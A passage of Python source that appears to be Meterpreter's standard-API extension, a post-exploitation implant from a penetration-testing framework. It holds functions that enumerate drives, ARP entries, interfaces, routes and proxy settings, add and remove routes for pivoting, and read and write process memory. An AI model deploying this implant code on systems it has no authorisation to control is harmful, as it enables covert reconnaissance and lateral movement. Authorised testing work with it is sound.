    response += tlv_pack(TLV_TYPE_STAT_BUF, st_buf)
    return ERROR_SUCCESS, response

@register_function_if(has_windll)
def stdapi_fs_mount_show(request, response):
    letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    k32 = ctypes.windll.kernel32
    mpr = ctypes.windll.mpr
    # Retrieves a bitmask representing the currently available disk drives
    bitmask = k32.GetLogicalDrives()
    # List of currently available disk drives
    drives = []
    for drive_letter in letters:
        # Check if drive is present
        if bitmask & 1:
            drives.append(drive_letter + ':')
        # Move to next drive letter
        bitmask >>= 1
    for drive in drives:
        drive_type = k32.GetDriveTypeW(drive)
        mount = bytes()
        mount += tlv_pack(TLV_TYPE_MOUNT_NAME, drive)
        mount += tlv_pack(TLV_TYPE_MOUNT_TYPE, drive_type)
        # Get UNC path for network drives
        if drive_type == DRIVE_REMOTE:
            buf = ctypes.create_unicode_buffer(1024)
            bufsize = ctypes.c_ulong(1024)
            if mpr.WNetGetUniversalNameW(drive, UNIVERSAL_NAME_INFO_LEVEL, ctypes.byref(buf), ctypes.byref(bufsize)) == 0:
                pUniversalNameInfo = ctstruct_unpack(UNIVERSAL_NAME_INFO, buf)
                mount += tlv_pack(TLV_TYPE_MOUNT_UNCPATH, pUniversalNameInfo.lpUniversalName)
        # Retrieve information about the amount of space that is available on a disk volume
        user_free_bytes = ctypes.c_ulonglong(0)
        total_bytes = ctypes.c_ulonglong(0)
        total_free_bytes = ctypes.c_ulonglong(0)
        if k32.GetDiskFreeSpaceExW(drive, ctypes.byref(user_free_bytes), ctypes.byref(total_bytes), ctypes.byref(total_free_bytes)):
            mount += tlv_pack(TLV_TYPE_MOUNT_SPACE_USER, user_free_bytes.value)
            mount += tlv_pack(TLV_TYPE_MOUNT_SPACE_TOTAL, total_bytes.value)
            mount += tlv_pack(TLV_TYPE_MOUNT_SPACE_FREE, total_free_bytes.value)
        response += tlv_pack(TLV_TYPE_MOUNT_GROUP, mount)
    return ERROR_SUCCESS, response

@register_function_if(sys.platform.startswith('linux') or has_windll)
def stdapi_net_config_get_arp_table(request, response):
    if has_windll:
        MIB_IPNET_TYPE_DYNAMIC = 3
        MIB_IPNET_TYPE_STATIC  = 4

        GetIpNetTable = ctypes.windll.iphlpapi.GetIpNetTable
        GetIpNetTable.argtypes = [ctypes.c_void_p, ctypes.POINTER(ctypes.c_ulong), ctypes.c_long]
        GetIpNetTable.restype = ctypes.c_ulong

        ipnet_table = None
        size = ctypes.c_ulong(0)
        result = GetIpNetTable(ipnet_table, size, False)

        if result == ERROR_INSUFFICIENT_BUFFER:
            ipnet_table = ctypes.cast(ctypes.create_string_buffer(bytes(), size.value), ctypes.c_void_p)

        elif result != ERROR_SUCCESS and result != ERROR_NO_DATA:
            return error_result_windows(result), response

        if not ipnet_table:
            return error_result_windows(), response

        result = GetIpNetTable(ipnet_table, size, False)
        if result != ERROR_SUCCESS:
            return error_result_windows(result), response

        class MIB_IPNETTABLE(ctypes.Structure):
            _fields_ = [
                ('dwNumEntries', ctypes.c_uint32),
                ('table', MIB_IPNETROW * ctypes.cast(ipnet_table.value, ctypes.POINTER(ctypes.c_ulong)).contents.value)
            ]

        ipnet_table = ctypes.cast(ipnet_table, ctypes.POINTER(MIB_IPNETTABLE))
        for ipnet_row in ipnet_table.contents.table:
            if (ipnet_row.dwType != MIB_IPNET_TYPE_DYNAMIC and ipnet_row.dwType != MIB_IPNET_TYPE_STATIC):
                continue
            arp_tlv  = bytes()
            arp_tlv += tlv_pack(TLV_TYPE_IP, struct.pack('<L', ipnet_row.dwAddr))
            arp_tlv += tlv_pack(TLV_TYPE_MAC_ADDRESS, bytes(ipnet_row.bPhysAddr)[:ipnet_row.dwPhysAddrLen])
            arp_tlv += tlv_pack(TLV_TYPE_MAC_NAME, str(ipnet_row.dwIndex))
            response += tlv_pack(TLV_TYPE_ARP_ENTRY, arp_tlv)

    elif sys.platform.startswith('linux'):
        arp_cache_file = '/proc/net/arp'
        if not os.path.exists(arp_cache_file):
            return ERROR_NOT_SUPPORTED, response

        arp_cache = open('/proc/net/arp', 'r')
        lines = arp_cache.readlines()
        for line in lines[1:]:
            fields = line.split()
            ip_address = fields[0]
            mac_address = fields[3]
            mac_address = bytes().join(binascii.unhexlify(h) for h in mac_address.split(':'))
            interface_name = fields[5]
            arp_tlv  = bytes()
            arp_tlv += tlv_pack(TLV_TYPE_IP, socket.inet_aton(ip_address))
            arp_tlv += tlv_pack(TLV_TYPE_MAC_ADDRESS, mac_address)
            arp_tlv += tlv_pack(TLV_TYPE_MAC_NAME, interface_name)
            response += tlv_pack(TLV_TYPE_ARP_ENTRY, arp_tlv)
        arp_cache.close()
    else:
        return ERROR_NOT_SUPPORTED, response
    return ERROR_SUCCESS, response

@register_function
def stdapi_net_config_get_interfaces(request, response):
    if hasattr(socket, 'AF_NETLINK') and hasattr(socket, 'NETLINK_ROUTE'):
        interfaces = stdapi_net_config_get_interfaces_via_netlink()
    elif sys.platform == 'darwin':
        interfaces = stdapi_net_config_get_interfaces_via_osx_ifconfig()
    elif has_windll:
        interfaces = stdapi_net_config_get_interfaces_via_windll()
    else:
        return ERROR_FAILURE, response
    for iface_info in interfaces:
        iface_tlv  = bytes()
        iface_tlv += tlv_pack(TLV_TYPE_MAC_NAME, iface_info.get('name', 'Unknown'))
        iface_tlv += tlv_pack(TLV_TYPE_MAC_ADDRESS, iface_info.get('hw_addr', '\x00\x00\x00\x00\x00\x00'))
        if 'mtu' in iface_info:
            iface_tlv += tlv_pack(TLV_TYPE_INTERFACE_MTU, iface_info['mtu'])
        if 'flags_str' in iface_info:
            iface_tlv += tlv_pack(TLV_TYPE_INTERFACE_FLAGS, iface_info['flags_str'])
        iface_tlv += tlv_pack(TLV_TYPE_INTERFACE_INDEX, iface_info['index'])
        for address in iface_info.get('addrs', []):
            iface_tlv += tlv_pack(TLV_TYPE_IP, address[1])
            if isinstance(address[2], (int, long)):
                iface_tlv += tlv_pack(TLV_TYPE_IP_PREFIX, address[2])
            else:
                iface_tlv += tlv_pack(TLV_TYPE_NETMASK, address[2])
        response += tlv_pack(TLV_TYPE_NETWORK_INTERFACE, iface_tlv)
    return ERROR_SUCCESS, response

def stdapi_net_config_get_interfaces_via_netlink():
    rta_align = lambda l: l+3 & ~3
    iface_flags = {
        0x0001: 'UP',
        0x0002: 'BROADCAST',
        0x0008: 'LOOPBACK',
        0x0010: 'POINTTOPOINT',
        0x0040: 'RUNNING',
        0x0100: 'PROMISC',
        0x1000: 'MULTICAST'
    }
    iface_flags_sorted = list(iface_flags.keys())
    # Dictionaries don't maintain order
    iface_flags_sorted.sort()
    interfaces = {}

    responses = netlink_request(RTM_GETLINK, IFINFOMSG())
    for res_data in responses:
        iface = ctstruct_unpack(IFINFOMSG, res_data)
        iface_info = {'index':iface.index}
        flags = []
        for flag in iface_flags_sorted:
            if (iface.flags & flag):
                flags.append(iface_flags[flag])
        iface_info['flags'] = iface.flags
        iface_info['flags_str'] = ' '.join(flags)
        cursor = ctypes.sizeof(IFINFOMSG)
        while cursor < len(res_data):
            attribute = ctstruct_unpack(RTATTR, res_data[cursor:])
            at_len = attribute.len
            attr_data = res_data[cursor + ctypes.sizeof(RTATTR):(cursor + at_len)]
            cursor += rta_align(at_len)

            if attribute.type == IFLA_ADDRESS:
                iface_info['hw_addr'] = attr_data
            elif attribute.type == IFLA_IFNAME:
                iface_info['name'] = attr_data
            elif attribute.type == IFLA_MTU:
                iface_info['mtu'] = struct.unpack('<I', attr_data)[0]
        interfaces[iface.index] = iface_info

    responses = netlink_request(RTM_GETADDR, IFADDRMSG())
    for res_data in responses:
        iface = ctstruct_unpack(IFADDRMSG, res_data)
        if not iface.family in (socket.AF_INET, socket.AF_INET6):
            continue
        iface_info = interfaces.get(iface.index, {})
        cursor = ctypes.sizeof(IFADDRMSG)
        while cursor < len(res_data):
            attribute = ctstruct_unpack(RTATTR, res_data[cursor:])
            at_len = attribute.len
            attr_data = res_data[cursor + ctypes.sizeof(RTATTR):(cursor + at_len)]
            cursor += rta_align(at_len)

            if attribute.type == IFA_ADDRESS:
                nm_bits = iface.prefixlen
                if iface.family == socket.AF_INET:
                    netmask = calculate_32bit_netmask(nm_bits)
                else:
                    netmask = calculate_128bit_netmask(nm_bits)
                addr_list = iface_info.get('addrs', [])
                addr_list.append((iface.family, attr_data, netmask))
                iface_info['addrs'] = addr_list
            elif attribute.type == IFA_LABEL:
                iface_info['name'] = attr_data
        interfaces[iface.index] = iface_info
    return interfaces.values()

def stdapi_net_config_get_interfaces_via_osx_ifconfig():
    output = get_process_output(['/sbin/ifconfig'])
    interfaces = []
    iface = {}
    for line in output.split('\n'):
        match = re.match(r'^([a-z0-9]+): flags=(\d+)<([A-Z,]*)> mtu (\d+)\s*$', line)
        if match is not None:
            if iface:
                interfaces.append(iface)
            iface = {}
            iface['name'] = match.group(1)
            iface['flags'] = int(match.group(2))
            iface['flags_str'] = match.group(3)
            iface['mtu'] = int(match.group(4))
            iface['index'] = len(interfaces)
            continue
        match = re.match(r'^\s+ether (([a-f0-9]{2}:){5}[a-f0-9]{2})\s*$', line)
        if match is not None:
            iface['hw_addr'] = ''.join(list(chr(int(b, 16)) for b in match.group(1).split(':')))
            continue
        match = re.match(r'^\s+inet ((\d+\.){3}\d+) netmask 0x([a-f0-9]{8})( broadcast ((\d+\.){3}\d+))?\s*$', line)
        if match is not None:
            addrs = iface.get('addrs', [])
            netmask = struct.pack('!I', int(match.group(3), 16))
            addrs.append((socket.AF_INET, inet_pton(socket.AF_INET, match.group(1)), netmask))
            iface['addrs'] = addrs
            continue
        match = re.match(r'^\s+inet6 ([a-f0-9:]+)(%[a-z0-9]+)? prefixlen (\d+)( secured)?( scopeid 0x[a-f0-9]+)?\s*$', line)
        if match is not None:
            addrs = iface.get('addrs', [])
            netmask = calculate_128bit_netmask(int(match.group(3)))
            addrs.append((socket.AF_INET6, inet_pton(socket.AF_INET6, match.group(1)), netmask))
            iface['addrs'] = addrs
            continue
    if iface:
        interfaces.append(iface)
    return interfaces

def stdapi_net_config_get_interfaces_via_windll():
    iphlpapi = ctypes.windll.iphlpapi
    Flags = (GAA_FLAG_INCLUDE_PREFIX | GAA_FLAG_SKIP_DNS_SERVER | GAA_FLAG_SKIP_MULTICAST | GAA_FLAG_SKIP_ANYCAST)
    AdapterAddresses = ctypes.c_void_p()
    SizePointer = ctypes.c_ulong()
    SizePointer.value = 0
    iphlpapi.GetAdaptersAddresses(socket.AF_UNSPEC, Flags, None, AdapterAddresses, ctypes.byref(SizePointer))
    AdapterAddressesData = (ctypes.c_uint8 * SizePointer.value)()
    iphlpapi.GetAdaptersAddresses(socket.AF_UNSPEC, Flags, None, ctypes.byref(AdapterAddressesData), ctypes.byref(SizePointer))
    AdapterAddresses = ctypes.string_at(ctypes.byref(AdapterAddressesData), SizePointer.value)
    AdapterAddresses = ctstruct_unpack(IP_ADAPTER_ADDRESSES, AdapterAddresses)
    if AdapterAddresses.u.s.Length <= 72:
        raise RuntimeError('invalid AdapterAddresses length')
    win_version = windll_GetVersion()
    interfaces = []
    pAdapterAddresses = ctypes.byref(AdapterAddresses)
    while pAdapterAddresses:
        AdapterAddresses = ctstruct_unpack(IP_ADAPTER_ADDRESSES, pAdapterAddresses)
        pAdapterAddresses = AdapterAddresses.Next
        pFirstPrefix = AdapterAddresses.FirstPrefix
        iface_info = {}
        iface_info['index'] = AdapterAddresses.u.s.IfIndex
        if AdapterAddresses.PhysicalAddressLength:
            iface_info['hw_addr'] = ctypes.string_at(ctypes.byref(AdapterAddresses.PhysicalAddress), AdapterAddresses.PhysicalAddressLength)
        iface_desc = ctypes.wstring_at(AdapterAddresses.Description)
        if not is_str(iface_desc):
            iface_desc = str(iface_desc)
        iface_info['name'] = iface_desc
        iface_info['mtu'] = AdapterAddresses.Mtu
        pUniAddr = AdapterAddresses.FirstUnicastAddress
        while pUniAddr:
            UniAddr = ctstruct_unpack(IP_ADAPTER_UNICAST_ADDRESS, pUniAddr)
            pUniAddr = UniAddr.Next
            address = ctstruct_unpack(SOCKADDR, UniAddr.Address.lpSockaddr)
            if not address.sa_family in (socket.AF_INET, socket.AF_INET6):
                continue
            prefix = 0
            if win_version.dwMajorVersion >= 6:
                prefix = UniAddr.OnLinkPrefixLength
            elif pFirstPrefix:
                ip_adapter_prefix = 'QPPIL'
                prefix_data = ctypes.string_at(pFirstPrefix, struct.calcsize(ip_adapter_prefix))
                prefix = struct.unpack(ip_adapter_prefix, prefix_data)[4]
            iface_addresses = iface_info.get('addrs', [])
            if address.sa_family == socket.AF_INET:
                iface_addresses.append((socket.AF_INET, ctypes.string_at(ctypes.byref(address.sa_data), 6)[2:], prefix))
            else:
                iface_addresses.append((socket.AF_INET6, ctypes.string_at(ctypes.byref(address.sa_data), 22)[6:], prefix))
            iface_info['addrs'] = iface_addresses
        interfaces.append(iface_info)
    return interfaces

@register_function
def stdapi_net_config_get_routes(request, response):
    if hasattr(socket, 'AF_NETLINK') and hasattr(socket, 'NETLINK_ROUTE'):
        routes = stdapi_net_config_get_routes_via_netlink()
    elif sys.platform == 'darwin':
        routes = stdapi_net_config_get_routes_via_osx_netstat()
    elif has_windll:
        routes = stdapi_net_config_get_routes_via_windll()
    else:
        return ERROR_FAILURE, response
    for route_info in routes:
        route_tlv  = bytes()
        route_tlv += tlv_pack(TLV_TYPE_SUBNET, route_info['subnet'])
        route_tlv += tlv_pack(TLV_TYPE_NETMASK, route_info['netmask'])
        route_tlv += tlv_pack(TLV_TYPE_GATEWAY, route_info['gateway'])
        route_tlv += tlv_pack(TLV_TYPE_STRING, route_info['iface'])
        route_tlv += tlv_pack(TLV_TYPE_ROUTE_METRIC, route_info.get('metric', 0))
        response += tlv_pack(TLV_TYPE_NETWORK_ROUTE, route_tlv)
    return ERROR_SUCCESS, response

def _win_route_add_remove(is_add, request, response):
    class IPAddr(ctypes.Structure):
        _fields_ = [
            ("S_addr", ctypes.c_ulong)]

    MIB_IPROUTE_TYPE_INDIRECT = 4
    MIB_IPPROTO_NETMGMT = 3

    GetBestInterface = ctypes.windll.Iphlpapi.GetBestInterface
    GetBestInterface.argtypes = [IPAddr, ctypes.POINTER(ctypes.c_ulong)]
    GetBestInterface.restype = ctypes.c_ulong

    CreateIpForwardEntry = ctypes.windll.Iphlpapi.CreateIpForwardEntry
    CreateIpForwardEntry.argtypes = [PMIB_IPFORWARDROW]
    CreateIpForwardEntry.restype = ctypes.c_ulong

    DeleteIpForwardEntry = ctypes.windll.Iphlpapi.DeleteIpForwardEntry
    DeleteIpForwardEntry.argtypes = [PMIB_IPFORWARDROW]
    DeleteIpForwardEntry.restype = ctypes.c_ulong

    GetIpInterfaceEntry = ctypes.windll.Iphlpapi.GetIpInterfaceEntry
    GetIpInterfaceEntry.argtypes = [ctypes.POINTER(MIB_IPINTERFACE_ROW)]
    GetIpInterfaceEntry.restype = ctypes.c_ulong

    subnet = packet_get_tlv(request, TLV_TYPE_SUBNET_STRING)['value']
    netmask = packet_get_tlv(request, TLV_TYPE_NETMASK_STRING)['value']
    gateway = packet_get_tlv(request, TLV_TYPE_GATEWAY_STRING)['value']

    route = MIB_IPFORWARDROW()
    route.dwForwardDest = socket.ntohl(addr_atoi4(subnet))
    route.dwForwardMask = socket.ntohl(addr_atoi4(netmask))
    route.dwForwardNextHop = socket.ntohl(addr_atoi4(gateway))
    route.dwForwardType = MIB_IPROUTE_TYPE_INDIRECT
    route.dwForwardProto = MIB_IPPROTO_NETMGMT
    route.dwForwardAge = -1
    route.dwForwardMetric1 = 0

    best_iface = ctypes.c_ulong()
    ip_addr = IPAddr(socket.ntohl(addr_atoi4(subnet)))
    result = GetBestInterface(ip_addr, ctypes.byref(best_iface))
    if result != ERROR_SUCCESS:
        return error_result_windows(result), response
    route.dwForwardIfIndex = best_iface

    iface = MIB_IPINTERFACE_ROW(Family=WIN_AF_INET, InterfaceIndex=route.dwForwardIfIndex)
    result = GetIpInterfaceEntry(ctypes.byref(iface))
    if result != ERROR_SUCCESS:
        return error_result_windows(result), response
    route.dwForwardMetric1 = iface.Metric

    if is_add:
        result = CreateIpForwardEntry(ctypes.byref(route))
    else:
        result = DeleteIpForwardEntry(ctypes.byref(route))
    if result != ERROR_SUCCESS:
        return error_result_windows(result), response

    return ERROR_SUCCESS, response

@register_function_if(has_windll)
def stdapi_net_config_add_route(request, response):
    return _win_route_add_remove(True, request, response)

@register_function_if(has_windll)
def stdapi_net_config_remove_route(request, response):
    return _win_route_add_remove(False, request, response)

def stdapi_net_config_get_routes_via_netlink():
    rta_align = lambda l: l+3 & ~3
    responses = netlink_request(RTM_GETROUTE, RTMSG(family=socket.AF_UNSPEC))
    routes = []
    for res_data in responses:
        rtmsg = ctstruct_unpack(RTMSG, res_data)
        cursor = rta_align(ctypes.sizeof(RTMSG))
        route = {'table': rtmsg.table}
        if rtmsg.family == socket.AF_INET:
            route['gateway'] = route['subnet'] = inet_pton(socket.AF_INET, '0.0.0.0')
            route['netmask'] = calculate_32bit_netmask(rtmsg.dst_len)
        elif rtmsg.family == socket.AF_INET6:
            route['gateway'] = route['subnet'] = inet_pton(socket.AF_INET6, '::')
            route['netmask'] = calculate_128bit_netmask(rtmsg.dst_len)
        else:
          continue
        while cursor < len(res_data):
            attribute = ctstruct_unpack(RTATTR, res_data[cursor:])
            at_len = attribute.len
            attr_data = res_data[cursor + ctypes.sizeof(RTATTR):(cursor + at_len)]
            cursor += rta_align(at_len)
            if attribute.type == RTA_DST:
                route['subnet'] = attr_data
            if attribute.type == RTA_GATEWAY:
                route['gateway'] = attr_data
            elif attribute.type == RTA_TABLE:
                route['table'] = struct.unpack('<I', attr_data)[0]
            elif attribute.type == RTA_OIF:
                route['iface'] = _linux_if_indextoname(struct.unpack('<I', attr_data)[0])
            elif attribute.type == RTA_PRIORITY:
                route['metric'] = struct.unpack('<I', attr_data)[0]
        if route['table'] != RT_TABLE_MAIN:
            continue
        routes.append(route)
    return routes

def stdapi_net_config_get_routes_via_osx_netstat():
    output = get_process_output(['/usr/sbin/netstat', '-rn'])
    routes = []
    state = None
    has_refs = None
    for line in output.split('\n'):
        line = line.strip()
        if state is None:
            if line == 'Internet:':
                state = socket.AF_INET
            elif line == 'Internet6:':
                state = socket.AF_INET6
            continue
        words = line.split()
        if len(words) < 4:
            state = None
            has_refs = None
            continue
        if words[0].lower() == 'destination':
            if len(words) > 5 and words[3].lower() == 'refs':
                has_refs = True
            continue
        destination, gateway, flags, iface = words[:4]
        if has_refs:
            iface = words[5]
        if state == socket.AF_INET:
            all_nets = '0.0.0.0/0'
            bits = 32
            calc_netmask = calculate_32bit_netmask
        elif state == socket.AF_INET6:
            all_nets = '::/0'
            bits = 128
            calc_netmask = calculate_128bit_netmask
        else:
            continue
        if destination == 'default':
            destination = all_nets
        if re.match('link#\\d+', gateway) or re.match('([0-9a-f]{1,2}:){5}[0-9a-f]{1,2}', gateway) or re.match('([0-9a-f]{1,2}.){5}[0-9a-f]{1,2}', gateway):
            gateway = all_nets[:-2]
        if '/' in destination:
            destination, netmask_bits = destination.rsplit('/', 1)
            netmask_bits = int(netmask_bits)
        else:
            netmask_bits = bits
        if '%' in destination:
            destination, _ = destination.rsplit('%', 1)
        if '%' in gateway:
            gateway, _ = gateway.rsplit('%', 1)
        if state == socket.AF_INET:
            while destination.count('.') < 3:
                destination += '.0'
        routes.append({
            'subnet': inet_pton(state, destination),
            'netmask': calc_netmask(netmask_bits),
            'gateway': inet_pton(state, gateway),
            'metric': 0,
            'iface': iface
        })
    return routes

def stdapi_net_config_get_routes_via_windll():
    iphlpapi = ctypes.windll.iphlpapi
    if not hasattr(iphlpapi, 'GetIpForwardTable2'):  # added in Vista / 2008
        return stdapi_net_config_get_routes_via_windll2()
    routes = []
    iface_names = {}
    for iface in stdapi_net_config_get_interfaces_via_windll():
        iface_names[iface['index']] = iface['name']
    for family in [WIN_AF_INET, WIN_AF_INET6]:
        table = PMIB_IPFORWARD_TABLE2()
        if iphlpapi.GetIpForwardTable2(family, ctypes.byref(table)):
            continue
        table = table.contents
        rows = ctypes.cast(table.Table, PMIB_IPFORWARD_ROW2)
        for index in range(table.NumEntries):
            row = rows[index]
            route = {}
            if family == WIN_AF_INET:
                route['subnet'] = ctarray_to_bytes(row.DestinationPrefix.Prefix.Ipv4.sin_addr)
                route['netmask'] = calculate_32bit_netmask(row.DestinationPrefix.PrefixLength)
                route['gateway'] = ctarray_to_bytes(row.NextHop.Ipv4.sin_addr)
            elif family == WIN_AF_INET6:
                route['subnet'] = ctarray_to_bytes(row.DestinationPrefix.Prefix.Ipv6.sin6_addr)
                route['netmask'] = calculate_128bit_netmask(row.DestinationPrefix.PrefixLength)
                route['gateway'] = ctarray_to_bytes(row.NextHop.Ipv6.sin6_addr)
            iface = MIB_IPINTERFACE_ROW(Family=family, InterfaceIndex=row.InterfaceIndex)
            if iphlpapi.GetIpInterfaceEntry(ctypes.byref(iface)):
                continue
            route['metric'] = row.Metric + iface.Metric
            route['iface'] = iface_names.get(row.InterfaceIndex, str(row.InterfaceIndex))
            routes.append(route)
    return routes

def stdapi_net_config_get_routes_via_windll2():
    iphlpapi = ctypes.windll.iphlpapi
    routes = []
    iface_names = {}
    for iface in stdapi_net_config_get_interfaces_via_windll():
        iface_names[iface['index']] = iface['name']
    size = ctypes.c_uint32(0)
    table = MIB_IPFORWARDTABLE()
    iphlpapi.GetIpForwardTable(ctypes.byref(table), ctypes.byref(size), False)
    if size.value:
        buffer = (ctypes.c_uint8 * size.value)()
        table = ctypes.cast(buffer, PMIB_IPFORWARDTABLE).contents
        iphlpapi.GetIpForwardTable(ctypes.byref(table), ctypes.byref(size), False)
        rows = ctypes.cast(table.table, PMIB_IPFORWARDROW)
        for index in range(table.dwNumEntries):
            row = rows[index]
            routes.append({
                'subnet': struct.pack('<I', row.dwForwardDest),
                'netmask': struct.pack('<I', row.dwForwardMask),
                'gateway': struct.pack('<I', row.dwForwardNextHop),
                'metric': row.dwForwardMetric1,
                'iface': iface_names.get(row.dwForwardIfIndex, str(row.dwForwardIfIndex))
            })
    return routes

@register_function_if(has_windll)
def stdapi_net_config_get_proxy(request, response):
    winhttp = ctypes.windll.winhttp
    proxy_config = WINHTTP_CURRENT_USER_IE_PROXY_CONFIG()
    if not winhttp.WinHttpGetIEproxy_configForCurrentUser(ctypes.byref(proxy_config)):
        return error_result_windows(), response
    response += tlv_pack(TLV_TYPE_PROXY_CFG_AUTODETECT, proxy_config.fAutoDetect)
    if proxy_config.lpszAutoConfigUrl:
        response += tlv_pack(TLV_TYPE_PROXY_CFG_AUTOCONFIGURL, proxy_config.lpszAutoConfigUrl)
    if proxy_config.lpszProxy:
        response += tlv_pack(TLV_TYPE_PROXY_CFG_PROXY, proxy_config.lpszProxy)
    if proxy_config.lpszProxyBypass:
        response += tlv_pack(TLV_TYPE_PROXY_CFG_PROXYBYPASS, proxy_config.lpszProxyBypass)
    return ERROR_SUCCESS, response

@register_function
def stdapi_net_resolve_host(request, response):
    hostname = packet_get_tlv(request, TLV_TYPE_HOST_NAME)['value']
    family = packet_get_tlv(request, TLV_TYPE_ADDR_TYPE)['value']
    if family == WIN_AF_INET:
        family = socket.AF_INET
    elif family == WIN_AF_INET6:
        family = socket.AF_INET6
    else:
        raise Exception('invalid family')
    result = resolve_host(hostname, family)
    response += tlv_pack(TLV_TYPE_IP, result['packed_address'])
    response += tlv_pack(TLV_TYPE_ADDR_TYPE, result['family'])
    return ERROR_SUCCESS, response

@register_function
def stdapi_net_resolve_hosts(request, response):
    family = packet_get_tlv(request, TLV_TYPE_ADDR_TYPE)['value']
    if family == WIN_AF_INET:
        family = socket.AF_INET
    elif family == WIN_AF_INET6:
        family = socket.AF_INET6
    else:
        raise Exception('invalid family')
    for hostname in packet_enum_tlvs(request, TLV_TYPE_HOST_NAME):
        hostname = hostname['value']
        try:
            result = resolve_host(hostname, family)
        except socket.error:
            result = {'family':family, 'packed_address':''}
        response += tlv_pack(TLV_TYPE_IP, result['packed_address'])
        response += tlv_pack(TLV_TYPE_ADDR_TYPE, result['family'])
    return ERROR_SUCCESS, response

@register_function
def stdapi_net_socket_tcp_shutdown(request, response):
    channel_id = packet_get_tlv(request, TLV_TYPE_CHANNEL_ID)['value']
    how = packet_get_tlv(request, TLV_TYPE_SHUTDOWN_HOW).get('value', socket.SHUT_RDWR)
    channel = meterpreter.channels[channel_id]
    channel.sock.shutdown(how)
    return ERROR_SUCCESS, response

def _linux_get_maps():
    maps = []
    lines = open('/proc/' + str(os.getpid()) + '/maps', 'r')
    for line in lines:
        region = dict(zip(
            ('address', 'perms', 'offset', 'dev', 'inode', 'pathname'),
            line.split(' ', 5)
        ))
        region['address-start'], region['address-end'] = region.pop('address').split('-')
        region['address-start'] = int(region['address-start'], 16)
        region['address-end'] = int(region['address-end'], 16)
        region['inode'] = int(region['inode'])
        region['offset'] = int(region['offset'], 16)
        region['pathname'] = region['pathname'].strip()
        region['size'] = region['address-end'] - region['address-start']
        maps.append(region)
    return maps

def _linux_check_maps(address, size, perms=''):
    perms = perms.lower()
    maps = _linux_get_maps()

    cursor = address
    address += size
    while cursor < address:
        for region in maps:
            if region['address-start'] <= cursor < region['address-end']:
                break
        else:
            return False
        for perm in perms:
            if perm == '-':
                continue
            if not perm in region['perms']:
                return False
        if cursor + size < region['address-end']:
            break
        size -= region['address-end'] - cursor
        cursor = region['address-end']
    return True

def _linux_if_indextoname(index):
    name = (ctypes.c_char * 256)()
    if libc.if_indextoname(index, name):
        return name.value.decode('ascii')

def _linux_memread(address, size):
    if not hasattr(libc, 'process_vm_readv'):
        # requires linux 3.2+ / glibc 2.15+, see:
        # http://man7.org/linux/man-pages/man2/process_vm_readv.2.html#VERSIONS
        raise RuntimeError('process_vm_readv is unavailable')
    if not _linux_check_maps(address, size, perms='r'):
        raise RuntimeError('invalid permissions')
    buff = (ctypes.c_byte * size)()
    local_iov = IOVEC(iov_base=ctypes.cast(buff, ctypes.c_void_p), iov_len=size)
    remote_iov = IOVEC(iov_base=address, iov_len=size)
    result = libc.process_vm_readv(
        os.getpid(),
        ctypes.byref(local_iov),
        1,
        ctypes.byref(remote_iov),
        1,
        0
    )
    if result == -1:
        raise RuntimeError('operation failed')
    return ctarray_to_bytes(buff)

def _linux_memwrite(address, data):
    if not hasattr(libc, 'process_vm_writev'):
        # requires linux 3.2+ / glibc 2.15+, see:
        # http://man7.org/linux/man-pages/man2/process_vm_writev.2.html#VERSIONS
        raise RuntimeError('process_vm_writev is unavailable')
    size = len(data)
    if not _linux_check_maps(address, size, perms='w'):
        raise RuntimeError('invalid permissions')
    buff = bytes_to_ctarray(data)
    local_iov = IOVEC(iov_base=ctypes.cast(buff, ctypes.c_void_p), iov_len=size)
    remote_iov = IOVEC(iov_base=address, iov_len=size)
    result = libc.process_vm_writev(
        os.getpid(),
        ctypes.byref(local_iov),
        1,
        ctypes.byref(remote_iov),
        1,
        0
    )
    if result == -1:
        raise RuntimeError('operation failed')
    return size

def _osx_memread(address, size):
    task = libc.mach_task_self()
    libc.mach_vm_read.argtypes = [ctypes.c_uint32, size_t, size_t, ctypes.POINTER(ctypes.c_void_p), ctypes.POINTER(ctypes.c_uint32)]
    libc.mach_vm_read.restype = ctypes.c_uint32
    pointer = ctypes.c_void_p()
    out_size = ctypes.c_uint32()
    result = libc.mach_vm_read(task, address, size, ctypes.byref(pointer), ctypes.byref(out_size))
    if result == 1:  # KERN_INVALID_ADDRESS
        raise RuntimeError('invalid address')
    elif result == 2:  # KERN_PROTECTION_FAILURE
        raise RuntimeError('invalid permissions')
    if result != 0 or size != out_size.value:
        raise RuntimeError('operation failed')
    buff = ctypes.cast(pointer, ctypes.POINTER(ctypes.c_byte * out_size.value))
    return ctarray_to_bytes(buff.contents)

def _osx_memwrite(address, data):
    task = libc.mach_task_self()
    libc.mach_vm_write.argtypes = [ctypes.c_uint32, size_t, ctypes.c_void_p, ctypes.c_uint32]
    libc.mach_vm_write.restype = ctypes.c_uint32
    buff = bytes_to_ctarray(data)
    if libc.mach_vm_write(task, address, buff, len(buff)) != 0:
        raise RuntimeError('operation failed')
    return len(buff)

def _win_format_message(source, msg_id):
    EN_US = 0
    msg_flags = 0
    msg_flags |= 0x00000100  # FORMAT_MESSAGE_ALLOCATE_BUFFER
    msg_flags |= 0x00000200  # FORMAT_MESSAGE_IGNORE_INSERTS
    msg_flags |= 0x00000800  # FORMAT_MESSAGE_FROM_HMODULE
    msg_flags |= 0x00001000  # FORMAT_MESSAGE_FROM_SYSTEM
    FormatMessage = ctypes.windll.kernel32.FormatMessageA
    FormatMessage.argtypes = [ctypes.c_uint32, ctypes.c_void_p, ctypes.c_uint32, ctypes.c_uint32, ctypes.c_void_p, ctypes.c_uint32, ctypes.c_void_p]
    FormatMessage.restype = ctypes.c_uint32
    LocalFree = ctypes.windll.kernel32.LocalFree
    LocalFree.argtypes = [ctypes.c_void_p]

    buff = ctypes.c_char_p()
    if not FormatMessage(msg_flags, source, msg_id, EN_US, ctypes.byref(buff), 0, None):
        return None
    message = buff.value.decode('utf-8').rstrip()
    LocalFree(buff)
    return message

def _win_memread(address, size, handle=-1):
    ReadProcessMemory = ctypes.windll.kernel32.ReadProcessMemory
    ReadProcessMemory.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p, size_t, ctypes.POINTER(size_t)]
    buff = (ctypes.c_byte * size)()
    read = size_t()
    result = ReadProcessMemory(handle, address, ctypes.byref(buff), size, ctypes.byref(read))
    if not result:
        return None
    return ctarray_to_bytes(buff)

def _win_memwrite(address, data, handle=-1):
    WriteProcessMemory = ctypes.windll.kernel32.WriteProcessMemory
